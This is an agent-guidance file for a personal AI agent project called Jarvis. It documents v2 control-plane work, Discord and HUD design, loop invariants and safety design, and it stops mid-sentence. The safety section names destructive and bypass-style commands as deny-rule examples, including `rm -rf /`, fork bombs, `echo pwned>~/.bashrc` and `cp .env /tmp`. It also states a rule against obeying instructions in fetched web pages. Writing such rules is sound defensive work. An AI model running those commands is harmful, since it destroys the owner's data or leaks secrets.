# CLAUDE.md

Notes for agents working on this codebase. Read before changing anything.

**Keep this file current.** When you add a capability, change an invariant, or
make a decision worth not relitigating, update the relevant section in the same
session — especially *Current state* and *Decisions already made*.

## Jarvis v2 is underway (2026-09-15) — read `docs/jarvis-v2-design.md` first

The v1 notes below remain the truth for everything **not** under
`jarvis/v2/`. v2 turns Jarvis into a control plane: Claude Code and Codex are
the brains for real work, the v1 loop survives only as the chat/voice fast
path, and the design document holds every decision, the work-package table,
and the live findings (R1–R8). Do not relitigate what its §2 table settles.

Merged on `main` so far, each with a free suite under `tests/v2/`: stores +
v1 session migration (WP1), the fast-path provider with `FAST_TOOLS` and
`task_propose` (WP2), the Claude provider over the Agent SDK (WP3 — the
`PreToolUse` hook is the gate; the SDK sandbox does **not** confine on this
WSL2, so Claude workers run unsandboxed and confinement routes to Codex;
and every client is built with an explicit `cli_path` from `resolve_cli()` —
`JARVIS_CLAUDE_CLI`, else the first real `claude` on PATH not under `/mnt/`,
else `~/.local/bin/claude`, else the SDK's bundled CLI with a warning —
because unset, the SDK runs its own lagging bundled copy, which refused a
newer model live on 2026-10-08; never pin the version, it self-updates),
the Codex provider over the app-server (WP4 — lifted from the trading firm's
transport; its reviewer escalates nothing to us, design R8), a worktree per
task (WP6), the daemon and local API (WP7, `jarvis daemon2`), one skills
folder for three consumers plus `jarvis-mcp` (WP8), and Discord rendering
(WP10a), Discord routing with thread-scoped approvals (WP10b), and the
task runner with the intake gate (WP11 — `TaskControl` in
`jarvis/v2/control.py` is the verb interface every surface uses). **The
backend ran one real task end to end on 2026-09-16** (design §17): Claude
orchestrated, Codex implemented in a worktree, a fresh Claude reviewer
failed it once and passed it second time, DONE in 198 s. **The HUD v2 landed the same
day** (WP12a backend + WP12b frontend under `hud/`, `jarvis hud` opens it;
design §12 and §18). **Projects are archived, never deleted in place**
(2026-10-06, decisions part B): an archived project or thread keeps every
record and is hidden from lists, placement and schedules; permanent delete
is HUD-only, archived-only, goes to a trash (`jarvis/v2/trash.py`) and never
touches a project folder or worktree; tasks pin the root they started under
(`Task.root`); names collide into `name (1)`; and no tool can archive or
delete (`tests/v2/archive_check.py`). Never call `_Store._delete` on a
project — it rmtrees the flat `projects/` directory. The status column is subscription meters: Claude's
5-hour and weekly windows (Claude Code's own usage endpoint, cached, the
login token never on `/usage`) and Codex's weekly window, green under 75%,
yellow from 75%, red from 90%. Role routing is in Settings; schedules are
one button; last routing decisions are a collapsed log. The HUD wears the
**Graphite** theme (2026-10-06, design §12.2 — replaces the cyan grid and
notched panels): flat warm off-black, one sparing glacier-cyan accent, amber
and red kept for pending and error only, and the default avatar's accent
moved to `#6fc3df` so the orb matches. Remaining: the long-bench comparison (WP13).

**Discord slash commands, S1 (2026-10-07, design §11.4; plan
`docs/plans/2026-10-07-slash-commands-plan.md`, decisions S-1..S-3).** One
static registry in `jarvis/v2/commands.py` — no skill, project or task ever
enters the registered payload, they are autocomplete only and re-checked on
submit. Global registration, synced once per daemon on the first READY (GET,
diff, one bulk PUT, never a DELETE); `jarvis discord commands
[--check|--sync]` is the human CLI, and `/applications/` is spelled only in
`jarvis/v2/discord/commands.py` (a test greps). Every interaction —
autocomplete included — is gated on our application id, the owner, context
0/1 and the place, and sends its deferral **before** any store write or
control call. Approval posts carry Approve/Deny buttons, never Always; a
press must match owner, message id and channel; `/always` is refused where
`entry_for` cannot mint a rule. Plain typed text in a clarifying task thread
answers its open question (one `_answer` with `/answer`); a voice note never
does. Verbs take a `Reply` sink so keyword and slash share one
implementation; keywords still work with a "(next time: `/x`)" nudge until
S2 removes them. `"discord_"` is a forbidden fast-path prefix.

**Discord update poster, PR A (2026-10-07, design §11.5; plan
`docs/plans/2026-10-07-discord-plan.md` §1).** `DiscordSurface`
(`jarvis/v2/discord/surface.py`) owns REST, the router and the `Reporter`,
started Reporter → `runner.serve()` → gateway and stopped gateway → runner →
`reporter.close(flush=True)`. A task's thread appears at its first
non-intake snapshot (D6). **Nothing pings but one line**: every guild post
carries `SUPPRESS_NOTIFICATIONS` (4096), and question/approval/blocked/
failed/done are followed by a separate `<@owner>` post (D1) — never in a DM.
Until B1 links channels, attention milestones go to the owner's DM prefixed
`[<project> · task <id>]`; later the DM is only for broken channels
(10003/50013), which also turns the HUD's Discord light amber. The sidecar
`tasks/<id>/discord.json` is read first and `TaskStore.save` never wipes a
stored `discord_thread_id` (bug 1); start-up reconcile **seeds existing
tasks silently** and never backfills terminal ones. 429s over 10 s raise
and defer; three transient failures open a 30 s → 5 min breaker. Logs carry
operation, status and Discord code only, and **httpx/httpcore are held at
WARNING** (`daemon.configure_logging`) — httpx logs full request URLs at
INFO, and an interaction reply's URL *is* its token (a live leak, fixed
2026-10-07). Everything posted is `secrets.scrub`bed before rendering,
approvals included. `DiscordRest` has no delete.

**Discord server and project channels, B1 (2026-10-07, design §11.6; plan
§2–§3).** `jarvis auth discord-guild` (human-only, `discord/setup.py`) picks
the server, prints the invite pinned to it (`permissions=309237763088`, D5:
**never Administrator**), blocks on a missing permission and warns on an
excess one (`discord/perms.py` is Discord's own algorithm), and only after a
y/N creates Jarvis, Jarvis Archive and #ungrouped and writes
`discord_guild.json` (mode 600, a **protected path**; re-read by the daemon,
no restart). The `ChannelLinker` (`discord/linker.py`, on the surface) links
the Inbox to #ungrouped — nothing else can move it — and owns every channel
write: the owner-only routes (`discord/routes.py`: create, link a pasted id
through one validation function, unlink — **the channel is kept** — and the
one-time backfill) act at once, as does an owner rename/archive/restore
(`project_updated.by == "owner"`); anything else (an `api` rename, a
crowding archive at 45 of 50, "Jarvis Archive 2") is a `discord_channel`
approval from "Jarvis housekeeping", never Always, and a deny does nothing.
Moving a channel never sends permission fields. **Only a sanctioned name is
ever applied** (review fix, 2026-10-07): a pending rename retries its own
name and is dropped when the project's name moves on — recomputing it from
the live name let an `api` rename ride an owner's 429 retry past the gate.
Renames and moves that fail transiently are kept pending, a start-up
reconcile fixes what an outage missed, and asks persist across restarts.
`POST`/`PATCH /projects`
refuse `discord_channel_id`. A configured guild gates placement, and a newly
linked project's tasks leave the DM safety net for threads at once. Tests
that touch Discord point `config.DISCORD_GUILD_PATH` at a temp file — the
owner's real one decides where channels go.

**Projects and folders from Discord, B2 (2026-10-07, design §11.7; plan
§5).** `/project new|link|unlink|channel` and `/channel archive|restore`
(handlers in `discord/project_commands.py`); archiving or deleting a
*project* stays HUD-only (B11). `/project new` with nothing filled in opens a
form; a bare name means `~/jarvis-work/<slug>` (`config.PROJECT_WORK_DIR`).
**`jarvis/v2/folders.py` is the folder boundary**: `check_project_folder`
only reads (names, never contents) and refuses — lexically *and* on the
realpath of the nearest existing ancestor — anything not strictly below
`config.PROJECT_FOLDER_ROOTS`, dot components, the credential/data/repo dirs
(inside or holding them), AppData, Windows-reserved names on `/mnt/<drive>`,
another project's root, a file or symlink, a missing parent (O4), and —
before any trimming — non-ASCII whitespace, invisible fillers and non-NFC
input. `make_project_folder` is **one `os.mkdir(path, 0o755)`**, reachable only from
the confirmation handler (grep-tested): a missing or non-empty folder is a
`project_folder` approval (exact path, Approve/Deny in the channel it was
typed in via `ApprovalRequest.discord_channel_id`, never Always, timeout
denies); an empty one is used silently (O5); a change after the yes asks
again. `POST /projects` and Discord share `projects.create_project`. From an
unlinked channel, `/project new` links that channel; from the DM it makes one;
from a linked channel it refuses; an unlinked channel also takes `/yes`/`/no`
for what was asked there, so the post's offered answers all work. Unlink asks
first; link (never stealing another channel's link), channel and `/channel
archive|restore` act at once (D4) — the moves go through the linker's `move()`
with reason `owner`/`restore` and drop any older pending move first, so a
retry cannot undo them. Tests point the folder roots at
temp dirs — never the owner's home. **B2b** (`project_propose`, the
Sonnet/Opus rule) waits for peers phase 0.

**Bugbot fixes (2026-10-08, design §11.5/§11.6/§11.8).** The rule they share:
**nothing is marked done before it worked, and nothing older overwrites
something newer.** The reporter skips an event snapshot older than the
sidecar's `seen_updated` (a reconcile that ran ahead of queued snapshots used
to rewind `phase` and post Done and the ping twice); a relink to another
channel gives a live task a new thread there ("Continued from"/"Moved to",
the old one kept — the O-C5 *Interpretation* for tasks). The linker marks its
reconcile, crowding count and Inbox link done only on success. A turn that
ends with a fatal error, or whose provider closed its handle, drops the daemon
session so the next send resumes it (`session.lost`); a refused model switch
rolls the record back only while it still asks for the refused choice. In
chats, a files-only Discord message runs as a turn and **never answers** a
question (D7); a question is recorded even with nowhere to post it, and
`daemon.answer` logs `question_answered` so the mirror re-posts an open one
of the running turn from the log — never one from before a restart.
`InteractionReply.said` is set only after something reached the owner (a
5xx on the idempotent edit is retried once; a followup or a 429 goes straight
to the channel — a retried POST can post twice). The fast path declares
`keeps_session_on_error`: its v1 transcript is saved only when a turn
returns, so a fatal 429/5xx keeps the session (dropping it would cost the
model the failed turn); it is dropped only once really closed.

**Every chat is a Discord thread, PR C (2026-10-07, design §11.8; plan
§4, decisions C1).** `ChatMirror` (`discord/mirror.py`) gives a chat a
thread in its project's channel at its first owner message and posts the
owner's *typed* words (never an inlined file), settled replies and one
footer, silent and scrubbed; what is typed in that thread runs the same
chat as `UserMessage(via="discord")` and is never echoed. **Progress is
`log.jsonl`** (`mirrored_through` in `threads/<id>/discord.json`), never the
bus. **`Thread.surface` is written only by `ThreadStore.set_surface`** —
`save` keeps the stored value whatever the caller holds, because the
daemon saves stale session copies. `daemon.send` publishes `user_message`.
The DM is one persisted Inbox chat (`surface="dm"`); a top-level message
in a project channel starts a new chat; anything else is ignored. Moves
open a new thread and rename the old `↪ moved to …` (O-C5); nothing on
Discord is ever deleted. A post the thread refuses (50001/50013) goes to
the owner's DM instead; an escape-hatch result shows its command line only,
never its output; speech is made from the scrubbed reply. Tests that read
`GET /discord` must point
`config.DISCORD_GUILD_PATH` at a temp file — the owner's setup is done now.

**Only the broker asks the owner (2026-10-08).** A provider's
`APPROVAL_REQUESTED`/`APPROVAL_RESOLVED` mean "the gate was consulted" — the
Claude hook emits a pair for *every* tool use, before `permit` decides — and
the daemon used to forward them onto the bus under those names, so auto mode
flashed a card and sent a DM per tool call (and a real question raised two
cards, one unanswerable). `daemon.GATE_KINDS` now logs them as
`gate_requested`/`gate_resolved` and never publishes them; the bus's
`approval_requested` comes only from `PendingApprovals`, and the HUD and the
Discord watcher both ignore one without a broker `code`. A broker timeout or
shutdown now publishes `approval_resolved` too, so a Discord post loses its
buttons. Dictation falls back from parakeet (one OpenRouter endpoint,
Together; `HTTP 404: Provider returned 404` when it is down) to
`config.STT_FALLBACK_MODELS` (default `x-ai/grok-stt-1.0`; free suite
`tests/voice_stt_check.py`), and `/stt` answers 502 with a sentence. The HUD
reads the preview port from `/status` → `workshop_port`, and `hud_v2_check`
aborts and fails any request to 8402/8403/8405 — it used to load the live
daemon's preview.

Briefs for every package, including the ones in flight, are in
`docs/codex-briefs/`; each merged package left a `*-notes.md` beside its
brief with what its implementer verified and what it proposes.

Two v1 facts the v2 work already changed: **skills live at
`skills/<name>/SKILL.md`** (the Agent Skills format; `jarvis skills link`
symlinks them into `~/.claude/skills` and `~/.codex/skills`, skipping the
`jarvis-only` ones), and `jarvis/runtime.py` carries a `proposal` slot
beside the plan slot.

HUD rule (2026-10-06, design §18): **the chat pane decides where a message
goes; the sidebar only shows it.** The window holds a thread or a compose
row, never a separately stored project (`hud/src/lib/compose.ts`). **New
thread** is pinned at the top of the sidebar and starts in the last project
worked in. A moved thread keeps the folder and permission rules it was
opened with (`Thread.cwd`); a move re-labels, it never re-roots.

Per-thread model (2026-10-06, decisions A, design §8.1/§12.1/§18): **a chat
thread runs on OpenRouter (the fast path), Claude or Codex**, picked with
provider ▾ · model ▾ · effort ▾ beside `in: <project>`. The provider is fixed
by the first message; model and effort change from the next message. The
choice lives on the Thread record (`jarvis/v2/thread_model.py`) — **never
rewrite `brief.json`** — and the daemon hands it to the provider per turn
(`set_model` on all three providers). A default thread follows the global
Model picker **every turn** (whose choice is *the* default — set, reset and
unpinned in the HUD's Model picker, 2026-10-08; see *Model selector*); Claude defaults to `claude-opus-5-5` at high,
Codex to its routing default; effort defaults to `high` (or the roster's pin)
within the model's ladder. **Only an explicit model pins a thread** (A4
amendment, 2026-10-07): an effort-only change on a default thread stores the
effort and leaves `model` null, and `thread_model.effective` clamps it to
whatever the default supports at each turn (none for a default with no
reasoning control); choosing default again clears both. Claude and Codex chat threads are full agents in
the thread's folder, behind the same §6 permit as task workers, so **a
caller's `POST /threads` brief may not loosen the project** — `cwd`,
`profile`, `always_ask` and `mcp_servers` are the project's (or stricter),
else 400 (`Daemon.make_brief`). A provider the project cannot run (Codex off
`auto` or with always-ask additions; Claude and the fast path under `strict`)
is refused before any record exists, from the table in
`thread_model.PROFILES`, which the HUD greys providers out from too. A
refused mid-thread switch rolls the record back to what the provider still
runs, writes `switch to X refused: …; still on Y`, and sends the message on
the old model. An archived thread, or one in an archived project, cannot
change model (409, as with rename and move). The CLI model lists are `router.CLI_MODELS`, the one table the
router's vision filter, the chip, `routing.json`/`/route` validation and a
project's own `routing.models` (on `POST`/`PATCH /projects`) all read. **No tool can change a thread's model or provider** (asserted in
`tests/v2/fastpath_check.py`). The picker controls take exactly `{model}`,
`{model, effort}` (on `/models`), `{voice}`, `{muted}`, and refuse any other
key — the HUD sent the wrong keys for weeks and every click reset itself (A6).

**Bench comparability, from the same change:** a v2 default chat thread now
switches model mid-conversation when the global picker changes, and a pinned
thread ignores the picker entirely, and v2 chat effort defaults to `high`
rather than v1's `JARVIS_REASONING_EFFORT` (`max`). Any v2 bench run must pin
the thread's model and effort and record both (each turn's usage record now
carries `model` and `effort`), or its numbers are not comparable across runs.
v1 benches are unaffected: `Agent.effort` is `None` there.

## What this is

A personal agent ("Jarvis") with a **hand-rolled** tool-calling loop, routed
through OpenRouter so any model is a config change. The owner is a CS student
building it to learn agent internals, so **do not replace the loop with a
framework** (LangChain, the SDK tool runners, etc.). The from-scratch loop is
the point of the project, not an accident.

## Environment

- **WSL2 (Ubuntu 26.04) on Windows 11.** WSLg is active, so headed GUI apps
  render on the Windows desktop.
- Code lives on the Linux filesystem at `~/projects/Jarvis`. **Never move it to
  `/mnt/c`** — 9p is slow and mangles permissions/line endings. Windows can
  already reach it at `\\wsl.localhost\Ubuntu\home\johnw\projects`.
- **System Python 3.14 has no `ensurepip`, so `python3 -m venv` fails.** Use
  `uv` (already installed): `uv venv`, `uv pip install -e .`.
- `jarvis` is symlinked from `~/.local/bin` into `.venv/bin/jarvis`, so source
  edits take effect with no reinstall.
- `sudo` requires a password — you cannot run it from a tool call. Print the
  command and ask the user to run it.
- `gh` (2.86) and `vercel` (58.4) are installed **user-local in
  ~/.local/bin** (2026-08-01; npm's global prefix is /usr = sudo, so vercel
  went in via `npm install -g --prefix ~/.local`). A Windows-side vercel
  also exists on PATH at /mnt/c/... — the native one shadows it; don't
  "fix" that. Both CLIs auth per-user (`gh auth login`, `vercel login`),
  human-only.
- **WSLg audio is full duplex and verified** (2026-07-30): playback via
  `RDPSink`, mic via `RDPSource`, socket at `/mnt/wslg/PulseServer`. Two
  gotchas: client apps need `libpulse0` (now installed, with
  `pulseaudio-utils`) — Chromium dlopens `libpulse.so.0` at startup and
  silently has *no* audio devices without it; and a Chromium launched before
  that library existed must be fully restarted to see devices.

## Architecture

```
jarvis/
  agent.py      the loop — ~50 lines, read it first
  llm.py        OpenRouter client; the only file that knows about HTTP
  models.py     the model roster: the eligible OpenRouter catalog, the
                owner's shortlist, and tier() — which every model call
                resolves through instead of reading config.TIERS
  context.py    image eviction / result truncation / compaction
  runtime.py    per-run ContextVars (plan slot, approver, cancel, depth,
                toolset) — the channel dispatch() cannot give a tool
  browser.py    Playwright session on its own thread, allowlist, budget, tracing
  config.py     model tiers, paths, system prompt
  bench.py      tool-calling stress test
  agentbench.py agent-bench — whole-Jarvis, sandboxed, category-rated
  voice.py      tts()/stt() — swappable contract, HTTP stays in llm.py
  google_auth.py  one-time OAuth consent (human-only) + silent token refresh
  spotify_auth.py Spotify OAuth (PKCE, no client secret) + rotating refresh
  onshape_auth.py Onshape API keys + the pinned CAD sandbox/libraries
  desktop.py    WSL half of the desktop bridge (listener, session, allowlist)
  discord_approvals.py  the approval gate, asked in the owner's DMs
  discord_agent.py  the Discord conversation core (persistent agent + the
                spoken-turns-never-authorize rule), shared by face and daemon
  daemon.py     `jarvis daemon` — headless always-on service: gateway + DM-only
                approvals + health/lock endpoint on port 8405
  goals.py      the durable goal store: goal.json + runner-written journal
  goalrunner.py works goals in slices: steering, budgets, progress DMs
  permissions.py  modes (ask/all) + the persistent dangerous-tool allowlist
  workflows.py  background agents on their own threads (safe tools only)
  tasks.py      attended background tasks: full-toolset agents on their own
                threads whose approvals reach the owner's surface, attributed
  sessions.py   saved conversations: transcript, log, meta, titles, summaries
  avatars.py    who he presents as: name, wake phrases, SVG face + sanitizer
  avatar_templates.py  starter art for `jarvis avatar new` (avatars/ is
                gitignored, so a clone has nothing to look at otherwise)
  tools/        clock, files (read paged + line-numbered, write whole,
                edit by anchored replacement), search (grep_files — bounded,
                ripgrep with a Python fallback), memory, shell, web, browsing,
                gmail, onshape (CAD), skills, sessions (read past conversations),
                sqlite (read-only .db queries, mode=ro enforced by the
                engine), spotify (music: search, playlists, playback — a
                deferred tool group, see invariant 10), toolgroups
                (load_tools), goalctl (goal_report — how a goal run ends),
                voicectl (mute), avatarctl (which avatar), workflows,
                tasks (attended background delegation), plan (the working
                checklist), subagent (context isolation),
                desktop (drives Windows apps via the bridge)
  runtime.py    per-run state (plan, approver, depth) over ContextVars
  windows/      bridge.py — runs on Windows Python, owns all UI Automation;
                uiatree.py — tree rendering + refs, no Windows imports so the
                tests drive it on Linux
  skills/       one markdown file per skill — see tools/skills.py
  face/         server.py (HUD + speech + design routes), approvals.py (the
                gate), static/jarvis.html (the HUD), static/whiteboard.html
                (sketch → design board; output served from designs/ on
                WORKSHOP_PORT 8403 — its own origin, never the face's)
```

## Invariants — breaking these causes silent or hard failures

1. **Context pruning never deletes a message** (`context.py`). Every `tool`
   message must keep the `tool_call_id` its assistant message declared, or the
   next request 400s. Rewrite content in place. Compaction *does* delete, so it
   only cuts where **no tool_call is outstanding** — `find_cut_point()` walks
   the transcript tracking pending ids, and "is a user message" is *not*
   sufficient on its own. An image result is a bare `user` message wedged in
   behind its `tool` message (invariant 5), so a turn with two parallel renders
   lays out as `assistant(c1,c2) · tool(c1) · user(image) · tool(c2)` and that
   inner user message used to look like a legal boundary — cutting there
   orphaned `c2`. Fixed 2026-08-01; `tests/context_check.py` is the regression
   test (and is verified to fail against the old rule).

   Also pinned: **`messages[1]`, the original request, is never compacted
   away.** Compaction takes `messages[2:cut]`. It used to take `[1:cut]`, so
   the first casualty of a long run was the statement of what the run was for,
   leaving the model working from a cheap-tier paraphrase of its own goal.

   Consequence worth knowing: a cut point must be a `user` message, and a
   single turn contains none after the one that started it — so **inside one
   long turn, pruning is eviction and truncation only.** Compaction can only
   fire across turns (or at an image-carrier boundary).

2. **The assistant turn goes back verbatim.** Append `response.content` plus
   `tool_calls` unchanged. Reconstructing it loses the ids.

   **One exception, and only one** (`agent.py`, 2026-08-05): a turn with **no
   tool_calls and null content** is rewritten to `""`. Some providers reject
   that shape outright — Alibaba answers "The content field is a required
   field" — so appending it verbatim **poisons the transcript permanently**:
   every later request in that session 400s, and the failure surfaces a step
   after its cause. Found benching `qwen/qwen3.7-flash`, which returns
   `content: None` as a completion. Null content *with* tool_calls is legal
   everywhere and stays untouched, so the exception costs no ids and no
   parallel calls. `tests/context_check.py` covers both halves and is verified
   to fail against the old code. The general lesson is the same one the
   step-budget bug taught: **a transcript state the loop can create but cannot
   recover from is a bug, however rare the model that produces it.**

3. **All tool results for one assistant turn go back together**, each keyed to
   its call id. Splitting them across messages trains models out of parallel
   calls.

   Since 2026-08-09 those calls also *execute* in parallel, and two things hold
   it together. **Results are appended in call order, never completion order** —
   `_dispatch_calls` returns a list indexed by call position, so a fast third
   tool cannot land ahead of a slow first one. And **only an allowlist runs
   concurrently** (`tools.PARALLEL_SAFE`, plus a hard refusal for anything
   `dangerous`): the batches are maximal runs of *consecutive* safe calls, so a
   write between two reads splits them and the second read still sees the
   write. A worker that raises still yields a result string — a missing one
   would leave a `tool_call` unanswered and 400 the next request.

4. **Tool failures are returned as text, never raised.** `dispatch()` catches
   everything and returns an error string so the model can self-correct. The
   `recovery` bench task measures exactly this.

5. **A `tool` message can only hold a string.** Image-producing tools return
   `ToolResult(text=..., image_b64=...)` and the loop attaches the image as a
   separate `user` message right behind it.

6. **Tool schemas are generated from type hints.** Use
   `Annotated[str, "description"]`; never hand-write JSON schema. Defaults make
   a parameter optional.

7. **Durable state is rebuilt from source every step, and it lives in two
   places for two different reasons** (split 2026-08-09; it was all
   `messages[0]` before).

   `messages[0]` holds the **stable** half: the base prompt with the avatar
   rename applied. It changes only when the owner changes avatar.

   The **volatile** half — skills index, working plan, recent-session titles —
   is a `user` message carrying `CONTEXT_BLOCK_PREFIX`, lifted to the **tail**
   of the transcript before every request. `agent.working_context(messages)`
   finds it; `agent.durable_state(messages)` is both halves together, and is
   what tests should assert against rather than an index.

   **Why it moved: prompt caching.** Providers cache on a shared prefix, so a
   single `plan_write` at step 3 rewrote byte 0 and made every later step
   re-pay for the entire transcript. At the tail, the same write invalidates
   only what follows it — which is nothing. This is exactly why Claude Code
   puts its volatile state in `<system-reminder>` blocks on the latest user
   message rather than in the system prompt.

   **It is still prune-proof, for a better reason.** Index 0 was safe because
   nothing in `context.py` touches it; the block is safe because it is *rebuilt
   from source every step*, so a compaction that eats it costs nothing — the
   next step writes it again. Rebuilt per **step**, not per turn: a 40-step
   turn passes the top of `run_turn` once, and step 40 is exactly when the plan
   matters.

   Three things that fall out and are pinned by `tests/longhorizon_check.py`:
   the block is matched by **identity**, not equality, when it is lifted (two
   agents can hold blocks with identical text, and `list.remove` would take the
   wrong one); there is never more than **one** of it, within a turn or across
   turns; and it is **dropped before `session.record()`**, because persisting
   it would freeze one run's plan and skills index into the file and resume
   into a stale copy of both — the same reasoning that already kept
   `messages[0]` out of the save.

   Unchanged: an agent without `skill_read` never sees the skills index and one
   without `plan_write` never sees the plan block. Never describe a tool the
   model cannot call.

   Consequence worth knowing: the block is a real message, so **anything
   counting messages must exclude it** — `tests/longhorizon_check.py` has a
   `_n()` helper for exactly this, because scripts branching on
   `len(messages)` silently took the wrong branch when it appeared.

8. **Per-run state reaches tools through `runtime.py`, and fails closed.**
   `dispatch()` calls `func(**arguments)` with no agent reference, so the plan
   slot, the approver, the cancel check, the depth counter and the parent's
   toolset live in ContextVars bound by `run_turn`. They are per-thread, which
   is what keeps two concurrent agents (a workflow, the face's request threads)
   from sharing a checklist. An unbound approver **denies**. A sub-agent runs
   inside `contextvars.copy_context()` — it binds the same vars, so calling it
   directly would leave the parent holding the *child's* empty plan and the
   child's depth when the call returns.

   **Per-thread cuts both ways, and parallel dispatch (2026-08-09) is where it
   bites.** A tool running on a pool thread starts with an *empty* context, so
   it would hold an unbound approver — and unbound denies. A gated tool would
   begin refusing itself purely because it ran beside another one, which is a
   failure that never shows up in a single-tool test. `_dispatch_calls` takes a
   fresh `contextvars.copy_context()` **per worker** (one Context cannot be
   entered by two threads at once) and submits `ctx.run(...)`. The copies share
   the plan dict by reference, so a write through one is seen by the agent that
   owns it. `tests/loop_check.py` fails against a version that submits the bare
   function.

9. **All Playwright work happens on the browser's own thread.** The sync API
   is thread-affine and parks a *running* asyncio loop on whichever thread
   starts it — which crashed the chat REPL's prompt (2026-07-31) and would
   reject the face's per-request threads. Public `Session` methods marshal
   via `_submit()`; never call `SESSION.page` RPCs from outside `browser.py`
   (tests/benches use `Session.eval_js()`). Every surface stops the session
   on exit — a browser left running EPIPEs the Node driver when the process
   dies under it; `stop()` is a safe no-op if nothing started.

10. **A deferred tool group is absent from the request, and `tool_names=None`
   no longer means the whole registry** (`tools.ToolGroup`, 2026-08-21).

   Every registered tool's JSON schema is sent on **every** request, and the
   registry costs ~11k tokens before a word of conversation. That is the right
   trade for tools any turn might need and the wrong one for an integration
   that is idle in most conversations and *absent entirely* on a machine that
   never connected it. So a group is the skills index moved down a level: a
   one-line pointer in the working-context block, and the bulk on `load_tools`.

   Three states, and the first is the one that pays. **Unavailable** — the
   owner never ran the auth command — costs nothing at all: no schemas, and no
   pointer advertising a service that would only answer with a setup error.
   **Available** offers `core` only, which must be small but not empty: a round
   trip spent expanding a toolset is a round trip the owner waits through, and
   on the voice surface that is the whole latency budget. **Loaded** is
   everything, for the life of that agent. Measured on Spotify: 0 / 525 / 1318
   tokens per request, against 1318 unconditionally.

   `Agent.__init__` is where this binds: `tool_names=None` now resolves to
   `tools.default_names()`, not `REGISTRY`. **Anything that builds a toolset by
   iterating `tools.REGISTRY` silently re-includes the deferred half** —
   `tasks.task_tool_names` and `goalrunner.goal_tool_names` were both doing
   exactly that and were changed with it. That is the failure mode to watch
   for: it is not an error, it is the mechanism quietly not working.

   Two properties hold it together, and one deliberate non-property:

   - **The set is mutable and per-agent, reached through `runtime.py`** — the
     working plan's mechanism, for the working plan's reason. `load_tools`
     writes into a set the agent owns; `_sync_tools` folds it in on the next
     step and **re-binds `tool_names`**, so a sub-agent spawned after an
     expansion inherits it and one spawned before does not retroactively gain
     it. Expanding costs a one-time prefix-cache miss (tools are part of the
     cached prefix — invariant 7's reasoning, applied to the other end of the
     request), which is why `core` exists at all.
   - **An agent handed an explicit toolset cannot widen itself.** `loadable()`
     requires the group's core tools to already be in the agent's own set, the
     same intersection rule that stops a workflow reaching the browser through
     a child.
   - **It is not a boundary, and the code says so.** A deferred tool stays in
     `REGISTRY`, so `dispatch` refuses it with a pointer to `load_tools`
     rather than running it — but that guard **fails open** when no agent
     context is bound, unlike everything else in `runtime.py`. The reason is
     correctness, not security: dispatch has always let any agent call any
     registered tool by name (the approver is the actual gate), and what is
     genuinely new is that a model guessing a deferred tool's *name* has
     guessed its *arguments* too. An unbound context is a script or a test,
     not an agent reaching past its toolset.

## Safety design (deliberate, do not loosen without asking)

- Tools are **narrow and typed**, not one god-tool, so the harness has
  something to gate on. `run_readonly` (allowlisted binaries, no shell
  operators) vs `run_command` (`dangerous=True`, prompts the user).
- `write_file` enforces **read-before-write** — refuses to clobber a file the
  agent hasn't read this session.
- Browser: **public internet open, private network closed** (2026-07-31).
  Named hosts in `allowed_hosts` always pass; `'*'` (in the default now)
  covers only public address space — LAN/router/metadata addresses, and any
  name that merely *resolves* private (`config.is_lan_host`), are refused.
  Policy is re-checked on wherever the page actually lands
  (`_guard_landing()` after goto/click/submit backs out to about:blank), so
  redirects can't escape it; `fetch_page` applies the same rule before the
  request and after redirects. Standing controls: **fresh context per run**
  (never a real Chrome profile — no cookies, no logins to misuse) and a
  **120-action budget**. vocab-bench pins its session back to
  localhost-only so bench runs stay hermetic.
- Web content is untrusted. The system prompt tells the model never to follow
  instructions found inside fetched pages.
- **`grep_files` does not respect `.gitignore`, deliberately** (fixed
  2026-08-10, one day after it shipped). ripgrep applies gitignore rules by
  default and this repo gitignores `memory/*.md`, `avatars/`, `designs/` and
  `traces/` — so **searching Jarvis's own long-term memory returned nothing**
  the moment `rg` was installed, while the pure-Python fallback found it. Two
  backends, two answers, no error, and the failure depended on which binaries
  happened to be on the machine.

  `--no-ignore` is now passed and the skipping is explicit: one `SKIP_DIRS`
  set, walked by the fallback and turned into `--glob !dir/` for ripgrep, plus
  a shared `--max-filesize`. Measured on the real repo once ripgrep was
  installed (2026-08-10), which is the whole argument in one line:

      rg --files-with-matches '.' memory              ->  0 files
      rg --no-ignore --files-with-matches '.' memory  -> 18 files The principle worth keeping: **version control is
  not a relevance filter for an agent.** What is worth committing and what is
  worth searching are different questions, and memory is the case that proves
  it.

- **Command rules decide what never asks and what never runs** (`rules.py`,
  2026-08-09). The gate used to be binary: `dangerous=True` meant ask, and the
  only escape was the allowlist matched on a command's *first word* — "git"
  silences `git push` as thoroughly as `git status`. Three verdicts now, and
  the two that matter are at opposite ends. **DENY** is not approvable by
  anyone (sudo/su/doas, dd/mkfs/fdisk/shutdown, `rm -rf` at a filesystem or
  home root, `chmod -R 777 /`, fork bombs, raw block-device writes) — the same
  shape as the `.env` refusal: approving a command is not consent to what it
  does, so some things must never reach the owner as a yes/no question.
  **ALLOW** runs unasked (git writes, build/package tooling, file shuffling,
  dev-server process control, read-only staples). Everything else asks.

  Four properties hold it up, each of which was a bug waiting to happen:

  - **Every segment is judged and the worst verdict wins.** `git commit && rm
    -rf /` is one string with two commands in it; first-word matching waves it
    through. Command substitution can't be judged at all, so it forces ASK.
    `segments()` splits on `||`, `&&`, `;`, `|`, newline **and a bare `&`**
    (the last one missing until 2026-08-17 — `ls & rm -rf ~/work` was one
    segment and scored ALLOW), and it splits **quote-aware**, so a separator
    inside `git commit -m 'fix A & B'` is text rather than a second command.
  - **An ALLOW is only honoured for a *human-backed* approver**
    (`permissions.gate` sets `jarvis_human_backed`; `dispatch()` checks it).
    Caught in review: `workflows.py` hands its agents a deny-all approver
    *because* nobody is watching a background thread, and an auto-approve that
    skipped the approver would have silently converted "workflows cannot run
    dangerous tools" into "workflows can run any allowlisted one". Auto-approval
    is a convenience for a surface where the owner is present — never a
    property of the command by itself.
  - **An interpreter given inline source is not a build step.** `python` is
    allowed because running a script is routine; `python -c "…"` is arbitrary
    code, and allowing the stem would have allowed the language. `-c`/`-e`
    pulls it back to ASK — **including glued to its argument**, since shlex
    merges `-c"import os"` into one `-cimport os` token and the exact-token
    test saw no flag at all until 2026-08-17. The redirect rule had the same
    shape of hole (`echo pwned>~/.bashrc`) and is now scanned on the raw
    segment with quote state rather than on tokens.
  - **The secrets layer still wins.** `cp` is allowed, `cp .env /tmp` is not:
    `protected_in_command` runs inside the tool and is not overridable by any
